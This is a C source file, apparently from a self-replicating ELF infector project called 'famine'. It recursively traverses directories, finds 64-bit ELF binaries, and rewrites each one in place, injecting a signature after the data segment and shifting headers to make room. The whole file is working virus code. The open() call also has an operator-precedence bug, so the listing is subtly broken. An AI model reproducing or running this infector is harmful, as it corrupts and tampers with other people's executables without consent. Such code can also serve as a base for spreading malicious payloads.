#include "../famine.h"

int		modify_program_header(void *ptr, t_famine *info)
{
	Elf64_Ehdr	*ehdr;
	Elf64_Phdr	*phdr;
	int			i;

	ehdr = ptr;
	phdr = ptr + ehdr->e_phoff;
	if (!is_in_address(phdr) || !is_in_address(phdr + ehdr->e_phnum))
		return (0);
	i = -1;
	info->data = NULL;
	while (++i < ehdr->e_phnum)
	{
		if (phdr->p_type == 1 && (phdr->p_flags & 0b111) == PF_W + PF_R)
			info->data = phdr;
		else if (info->data && phdr->p_offset > info->data->p_offset + info->data->p_filesz)
		{
			phdr->p_offset += info->bits_added;
			phdr->p_paddr ? phdr->p_paddr += info->bits_added : 0;
			phdr->p_vaddr ? phdr->p_vaddr += info->bits_added : 0;
		}
		phdr += 1;
	}
	if (!info->data)
		return (0);
	return (1);
}

int		modify_sections(void *ptr, Elf64_Shdr *shdr_base, uint32_t shnum, uint32_t index, t_famine *info)
{
	int				i;
	Elf64_Shdr		*shdr;
	char			*sct_names;
	char			*name;

	if (index >= shnum || !is_in_address(shdr_base) || !is_in_address(shdr_base + shnum - 1))
		return (0);
	shdr = shdr_base + index;
	sct_names = ptr + shdr->sh_offset;
	if (!is_in_address(sct_names))
		return (0);
	i = -1;
	while (++i < (int)shnum)
	{
		shdr = shdr_base + i;
		name = sct_names + shdr->sh_name;
		if (!is_str_in_address(name))
			return (0);
		if (shdr->sh_offset >= info->data->p_offset + info->data->p_filesz && strcmp(".bss", name))
		{
			shdr->sh_addr ? shdr->sh_addr += info->bits_added : 0;
			shdr->sh_offset += info->bits_added;
		}
	}
	return (1);
}

int		rewrite_binary(void *ptr, Elf64_Ehdr *ehdr, t_famine *info, char *path)
{
	int			fd;
	uint64_t	size_begining;
	void		*end_file;
	int			wrote;
	void		*new_binary;

	new_binary = malloc(get_ptr_end() - get_ptr_start() + info->bits_added);
	ehdr->e_shoff += info->bits_added;
	size_begining = info->data->p_offset + info->data->p_filesz;
	memcpy(new_binary, ptr, size_begining);
	wrote = size_begining;
	memcpy(new_binary + wrote, signature, info->bits_added);
	wrote += info->bits_added;
	end_file = ptr + size_begining;
	memcpy(new_binary + wrote, end_file, (size_t)(get_ptr_end() - end_file));
	wrote += (size_t)(get_ptr_end() - end_file);
	if (wrote != get_ptr_end() - get_ptr_start() + info->bits_added)
		return (0);
	fd = open(path, O_WRONLY | O_TRUNC);
	if (fd < 0)
		return (0);
	if (wrote != write(fd, new_binary, wrote))
		return (0);
	if (close(fd) != 0)
		return (0);
	return (1);
}

int		infect_elf(void *ptr, char *path)
{
	Elf64_Ehdr      *ehdr;
	t_famine		info;

	if (!is_in_address(ptr + sizeof(*ehdr)))
		return (0);
	ehdr = ptr;
	if (strncmp((const char *)ehdr->e_ident, ELFMAG, 4))
		return (0);
	if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
		return (0);
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
		return (0);
	info.bits_added = strlen(signature) + 1;
	if (!modify_program_header(ptr, &info))
		return (0);
	if (is_infected(ptr + info.data->p_filesz + info.data->p_offset))
		return (0);
	if (!modify_sections(ptr, ptr + ehdr->e_shoff, ehdr->e_shnum, ehdr->e_shstrndx, &info))
		return (0);
	return (rewrite_binary(ptr, ehdr, &info, path));
}

void	process_file(char *name, char *path)
{
	int				fd;
	struct stat		buf;
	void			*ptr;

	if ((fd = open(path, O_RDONLY) < 0))
		return ;
	if (fstat(fd, &buf) < 0)
		return ((void)close(fd));
	if (!strcmp(".", name) || !strcmp("..", name))
		return ((void)close(fd));
	if (S_ISDIR(buf.st_mode))
	{
		close(fd);
		return (process_directory(path));
	}
	if (!S_ISREG(buf.st_mode))
		return ((void)close(fd));
	if (buf.st_size < 0)
		return ((void)close(fd));
	if ((ptr = mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		return ((void)close(fd));
	init_check_address(ptr, buf.st_size);
	printf("%s\n", path);
	infect_elf(ptr, path);
	munmap(ptr, buf.st_size);
	close(fd);
}